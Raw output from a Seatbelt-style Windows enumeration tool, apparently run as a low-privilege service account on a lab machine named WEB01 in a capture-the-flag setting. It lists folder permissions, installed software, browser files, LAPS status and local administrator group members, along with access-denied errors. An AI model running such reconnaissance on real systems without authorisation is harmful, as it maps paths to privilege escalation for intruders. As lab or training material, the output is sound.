  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files (x86)\Microsoft SQL Server\140\DTS\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files (x86)\Microsoft SQL Server\150\DTS\Binn\
  SDDL                           :

  Name                           : C:\Program Files\dotnet\
  SDDL                           : O:BAD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Microsoft\Web Platform Installer\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Users\Administrator.HACKTHEBOX\AppData\Local\Microsoft\WindowsApps
  SDDL                           :

  Name                           : %SystemRoot%\system32
  SDDL                           :

  Name                           : %SystemRoot%
  SDDL                           :

  Name                           : %SystemRoot%\System32\Wbem
  SDDL                           :

  Name                           : %SYSTEMROOT%\System32\WindowsPowerShell\v1.0\
  SDDL                           :

  Name                           : %SYSTEMROOT%\System32\OpenSSH\
  SDDL                           :

  Name                           : C:\Users\svc_dev\AppData\Local\Microsoft\WindowsApps
  SDDL                           : O:S-1-5-21-197600473-3515118913-3158175032-1003D:(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;S-1-5-21-197600473-3515118913-3158175032-1003)

====== EnvironmentVariables ======

====== ExplicitLogonEvents ======

ERROR: Unable to collect. Must be an administrator.
====== ExplorerMRUs ======

====== ExplorerRunCommands ======


  S-1-5-21-197600473-3515118913-3158175032-1003 :
    a          :  cmd\1
    MRUList    :  ab
    b          :  winver\1
====== FileInfo ======

  Comments                       :
  CompanyName                    : Microsoft Corporation
  FileDescription                : NT Kernel & System
  FileName                       : C:\WINDOWS\system32\ntoskrnl.exe
  FileVersion                    : 10.0.17763.6292 (WinBuild.160101.0800)
  InternalName                   : ntkrnlmp.exe
  IsDebug                        : False
  IsDotNet                       : False
  IsPatched                      : False
  IsPreRelease                   : False
  IsPrivateBuild                 : False
  IsSpecialBuild                 : False
  Language                       : English (United States)
  LegalCopyright                 : c Microsoft Corporation. All rights reserved.
  LegalTrademarks                :
  OriginalFilename               : ntkrnlmp.exe
  PrivateBuild                   :
  ProductName                    : Microsoftr Windowsr Operating System
  ProductVersion                 : 10.0.17763.6292
  SpecialBuild                   :
  Attributes                     : Archive
  CreationTimeUtc                : 9/17/2024 1:18:53 PM
  LastAccessTimeUtc              : 9/17/2024 1:18:54 PM
  LastWriteTimeUtc               : 9/17/2024 1:18:54 PM
  Length                         : 9672160
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;0x1200a9;;;SY)(A;;0x1200a9;;;BA)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)

====== FileZilla ======

====== FirefoxHistory ======

====== FirefoxPresence ======

====== Hotfixes ======

Enumerating Windows Hotfixes. For *all* Microsoft updates, use the 'MicrosoftUpdates' command.

ERROR:   [!] Terminating exception running command 'Hotfixes': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.HotfixCommand.<Execute>d__10.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== IdleTime ======

  CurrentUser : WEB01\svc_dev
  Idletime    : 13h:03m:37s:468ms (47017468 milliseconds)

====== IEFavorites ======

Favorites (svc_dev):

  http://go.microsoft.com/fwlink/p/?LinkId=255142

====== IETabs ======

ERROR:   [!] Terminating exception running command 'IETabs': System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
   --- End of inner exception stack trace ---
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)
   at AnschnallGurt.Commands.Browser.InternetExplorerTabCommand.<Execute>d__9.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== IEUrls ======

Internet Explorer typed URLs for the last 7 days


  S-1-5-21-197600473-3515118913-3158175032-1003

====== InstalledProducts ======

  DisplayName                    : Microsoft Edge
  DisplayVersion                 : 128.0.2739.79
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Edge Update
  DisplayVersion                 : 1.3.195.19
  Publisher                      :
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Help Viewer 2.3
  DisplayVersion                 : 2.3.28107
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2013 Redistributable (x64) - 12.0.40664
  DisplayVersion                 : 12.0.40664.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.40.33810
  DisplayVersion                 : 14.40.33810
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : SQL Server Integration Services Singleton
  DisplayVersion                 : 14.0.3002.136
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft .NET Framework 4.6 Targeting Pack
  DisplayVersion                 : 4.6.00081
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
  DisplayVersion                 : 14.24.28127
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft .NET Core SDK 2.1.509 (x64)
  DisplayVersion                 : 2.1.509
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft SQL Server 2016 Analysis Management Objects
  DisplayVersion                 : 13.1.4495.10
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2012 Redistributable (x86) - 11.0.61030
  DisplayVersion                 : 11.0.61030.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2015-2022 Redistributable (x86) - 14.40.33810
  DisplayVersion                 : 14.40.33810.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft SQL Server 2012 Analysis Management Objects
  DisplayVersion                 : 11.4.7001.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.40.33810
  DisplayVersion                 : 14.40.33810.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2022 X86 Additional Runtime - 14.40.33810
  DisplayVersion                 : 14.40.33810
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Analysis Services OLE DB Provider
  DisplayVersion                 : 15.0.2000.20
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft .NET Framework 4.6 Targeting Pack
  DisplayVersion                 : 4.6.81
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft SQL Server Management Studio - 18.4
  DisplayVersion                 : 15.0.18206.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.40664
  DisplayVersion                 : 12.0.40664
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft SQL Server Data Tools - Visual Studio 2017
  DisplayVersion                 : 14.0.16194.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft SQL Server 2014 Analysis Management Objects
  DisplayVersion                 : 12.2.5556.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161
  DisplayVersion                 : 9.0.30729.6161
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2013 Redistributable (x86) - 12.0.40664
  DisplayVersion                 : 12.0.40664.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : SQL Server Integration Services 2016
  DisplayVersion                 : 13.1.4495.10
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Visual Studio 2017 Isolated Shell for SSMS
  DisplayVersion                 : 15.0.28307.421
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2012 x86 Additional Runtime - 11.0.61030
  DisplayVersion                 : 11.0.61030
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2012 x86 Minimum Runtime - 11.0.61030
  DisplayVersion                 : 11.0.61030
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Help Viewer 2.3
  DisplayVersion                 : 2.3.28107
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft AS OLE DB Provider for SQL Server 2016
  DisplayVersion                 : 13.1.4495.10
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2012 Redistributable (x64) - 11.0.61030
  DisplayVersion                 : 11.0.61030.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Browser for SQL Server 2017
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Integration Services
  DisplayVersion                 : 15.0.1900.63
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.40664
  DisplayVersion                 : 12.0.40664
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : SQL Server Integration Services 2014
  DisplayVersion                 : 12.2.5556.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : SQL Server Integration Services 2012
  DisplayVersion                 : 11.4.7001.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
  DisplayVersion                 : 14.24.28127
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219
  DisplayVersion                 : 10.0.40219
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : SQL Server Integration Services Singleton
  DisplayVersion                 : 15.0.1301.433
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : Microsoft Visual C++ 2008 Redistributable - x86 9.0.21022
  DisplayVersion                 : 9.0.21022
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : GDR 2027 for SQL Server 2017 (KB4505224) (64-bit)
  DisplayVersion                 : 14.0.2027.2
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2017 (64-bit)
  DisplayVersion                 :
  Publisher                      :
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2017 (64-bit)
  DisplayVersion                 :
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.40664
  DisplayVersion                 : 12.0.40664
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2017 Setup (English)
  DisplayVersion                 : 14.0.2027.2
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Database Engine Shared
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Shared Management Objects
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 XEvent
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server Management Studio for Reporting Services
  DisplayVersion                 : 15.0.18206.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219
  DisplayVersion                 : 10.0.40219
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft VSS Writer for SQL Server 2017
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Database Engine Services
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Batch Parser
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft ASP.NET Core 2.1.13 Shared Framework (x64)
  DisplayVersion                 : 2.1.13.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.61030
  DisplayVersion                 : 11.0.61030
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft ODBC Driver 13 for SQL Server
  DisplayVersion                 : 14.0.2027.2
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server Management Studio for Analysis Services
  DisplayVersion                 : 15.0.18206.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server Management Studio
  DisplayVersion                 : 15.0.18206.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft .NET Core Host FX Resolver - 2.1.13 (x64)
  DisplayVersion                 : 16.116.28008
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Web Platform Installer 5.1
  DisplayVersion                 : 5.1.51515.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.40664
  DisplayVersion                 : 12.0.40664
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : VMware Tools
  DisplayVersion                 : 12.4.0.23259341
  Publisher                      : VMware, Inc.
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2022 X64 Additional Runtime - 14.40.33810
  DisplayVersion                 : 14.40.33810
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161
  DisplayVersion                 : 9.0.30729.6161
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft .NET Core SDK 2.1.509 (x64)
  DisplayVersion                 : 8.127.25855
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft .NET Core Host - 2.1.13 (x64)
  DisplayVersion                 : 16.116.28008
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Active Directory Authentication Library for SQL Server
  DisplayVersion                 : 15.0.1300.359
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Shared Management Objects
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft ODBC Driver 17 for SQL Server
  DisplayVersion                 : 17.4.1.1
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft OLE DB Driver for SQL Server
  DisplayVersion                 : 18.7.4.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Database Engine Shared
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127
  DisplayVersion                 : 14.24.28127
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127
  DisplayVersion                 : 14.24.28127
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SSMS Post Install Tasks
  DisplayVersion                 : 15.0.18206.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Connection Info
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Shared Management Objects Extensions
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2016 LocalDB
  DisplayVersion                 : 13.1.4001.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Windows Cache Extension 2.0 for PHP 7.3 (x64)
  DisplayVersion                 : 2.0.8
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server Management Studio
  DisplayVersion                 : 15.0.18206.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : IIS URL Rewrite Module 2
  DisplayVersion                 : 7.2.1993
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Common Files
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2012 Native Client
  DisplayVersion                 : 11.4.7462.6
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Connection Info
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 XEvent
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Web Deploy 4.0
  DisplayVersion                 : 10.0.1994
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2017 RsFx Driver
  DisplayVersion                 : 14.0.2027.2
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Common Files
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.40.33810
  DisplayVersion                 : 14.40.33810
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2012 Native Client
  DisplayVersion                 : 11.4.7001.0
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 DMF
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Analysis Services OLE DB Provider
  DisplayVersion                 : 15.0.2000.20
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Shared Management Objects Extensions
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft SQL Server 2017 T-SQL Language Service
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.61030
  DisplayVersion                 : 11.0.61030
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 DMF
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : Microsoft .NET Core Runtime - 2.1.13 (x64)
  DisplayVersion                 : 16.116.28008
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 Database Engine Services
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

  DisplayName                    : SQL Server 2017 SQL Diagnostics
  DisplayVersion                 : 14.0.1000.169
  Publisher                      : Microsoft Corporation
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x64

====== InterestingFiles ======


Accessed      Modified      Path
----------    ----------    -----
2024-09-19    2024-09-05    C:\Users\svc_dev\AppData\Local\Microsoft\Edge\User Data\Autofill\4.0.1.3\autofill_bypass_cache_forms.json
====== InterestingProcesses ======

ERROR:   [!] Terminating exception running command 'InterestingProcesses': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.InterestingProcessesCommand.<Execute>d__10.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== InternetSettings ======

General Settings
  Hive                               Key : Value

  HKCU                IE5_UA_Backup_Flag : 5.0
  HKCU                   PrivacyAdvanced : 1
  HKCU                   SecureProtocols : 2048
  HKCU             CertificateRevocation : 1
  HKCU          DisableCachingOfSSLPages : 1
  HKCU                        User Agent : Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU              ZonesSecurityUpgrade : System.Byte[]
  HKCU                WarnonZoneCrossing : 0
  HKCU                   EnableNegotiate : 1
  HKCU                      MigrateProxy : 1
  HKCU                       ProxyEnable : 0
  HKCU                      ActiveXCache : C:\Windows\Downloaded Program Files
  HKCU                CodeBaseSearchPath : CODEBASE
  HKCU                    EnablePunycode : 1
  HKCU                      MinorVersion : 0
  HKCU                    WarnOnIntranet : 1

URLs by Zone
  No URLs configured

Zone Auth Settings
====== KeePass ======

====== LAPS ======

  LAPS Enabled                          : False
  LAPS Admin Account Name               :
  LAPS Password Complexity              :
  LAPS Password Length                  :
  LAPS Expiration Protection Enabled    :
====== LastShutdown ======

  LastShutdown                   : 11/20/2024 8:42:54 AM

====== LocalGPOs ======

====== LocalGroups ======

Non-empty Local Groups (and memberships)


  ** WEB01\Administrators ** (Administrators have complete and unrestricted access to the computer/domain)

  User            WEB01\Administrator                      S-1-5-21-197600473-3515118913-3158175032-500
  Group           DAEDALUS\Domain Admins                   S-1-5-21-4088429403-1159899800-2753317549-512
  User            DAEDALUS\billing_user                    S-1-5-21-4088429403-1159899800-2753317549-1603

  ** WEB01\Guests ** (Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted)

  User            WEB01\Guest                              S-1-5-21-197600473-3515118913-3158175032-501

